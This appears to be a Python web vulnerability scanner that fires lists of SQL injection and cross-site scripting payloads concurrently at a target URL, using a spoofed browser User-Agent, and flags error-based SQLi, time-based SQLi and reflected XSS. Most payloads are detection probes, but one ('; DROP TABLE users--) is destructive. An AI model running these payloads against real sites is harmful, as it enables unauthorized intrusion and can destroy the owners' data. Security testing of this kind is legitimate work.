import requests
import time
import concurrent.futures
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

SQLI_PAYLOADS = [
    "' OR 1=1--", "\" OR \"1\"=\"1", "'; DROP TABLE users--",
    "' OR 'a'='a", "' OR 1=1#", "' OR 1=1/*", "' OR '1'='1' -- ",
    "' OR EXISTS(SELECT * FROM users)--", "' AND SLEEP(3)--",
    "' OR (SELECT COUNT(*) FROM users) > 0--", "' OR 1=1 LIMIT 1--",
    "' AND 1=0 UNION SELECT NULL--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
    "javascript:alert('XSS')", "<iframe src=javascript:alert('XSS')>",
    "<input type=image src=x onerror=alert('XSS')>", "<object data=javascript:alert('XSS')>",
    "<details open ontoggle=alert('XSS')>", "<marquee onstart=alert('XSS')>"
]

SQL_ERRORS = [
    "sql syntax", "mysql", "sqlstate", "syntax error", "unclosed quotation",
    "warning", "database error", "native client", "pdoexception", "odbc"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Create a requests session with retry logic
def create_session():
    session = requests.Session()
    retry = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

session = create_session()

def test_sqli_get(target_url, payload):
    url = f"{target_url}?test={payload}"
    try:
        start_time = time.time()
        r = session.get(url, headers=HEADERS, timeout=10)
        elapsed = time.time() - start_time
        content_lower = r.text.lower()

        if any(err in content_lower for err in SQL_ERRORS):
            return {
                "type": "SQL Injection (Error-Based)",
                "payload": payload,
                "url": url,
                "severity": "High"
            }
        elif elapsed > 4:
            return {
                "type": "SQL Injection (Time-Based)",
                "payload": payload,
                "url": url,
                "severity": "High"
            }
    except Exception as e:
        print(f"[!] SQLi GET failed for {url}: {e}")
    return None

def test_xss_get(target_url, payload):
    url = f"{target_url}?test={payload}"
    try:
        r = session.get(url, headers=HEADERS, timeout=10)
        if payload.lower() in r.text.lower():
            return {
                "type": "Reflected XSS (GET)",
                "payload": payload,
                "url": url,
                "severity": "High"
            }
    except Exception as e:
        print(f"[!] XSS GET failed for {url}: {e}")
    return None

def test_xss_post(target_url, payload):
    try:
        data = {'searchFor': payload}
        r = session.post(target_url, headers=HEADERS, data=data, timeout=10)
        if payload.lower() in r.text.lower():
            return {
                "type": "Reflected XSS (POST)",
                "payload": payload,
                "url": target_url,
                "severity": "High",
                "location": "POST parameter: searchFor"
            }
    except Exception as e:
        print(f"[!] XSS POST failed for {target_url}: {e}")
    return None

def scan_injection(target_url):
    results = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = []

        # Schedule SQLi tests
        for payload in SQLI_PAYLOADS:
            futures.append(executor.submit(test_sqli_get, target_url, payload))

        # Schedule XSS GET tests
        for payload in XSS_PAYLOADS:
            futures.append(executor.submit(test_xss_get, target_url, payload))

        # Schedule XSS POST tests
        for payload in XSS_PAYLOADS:
            futures.append(executor.submit(test_xss_post, target_url, payload))

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                results.append(result)

    return results
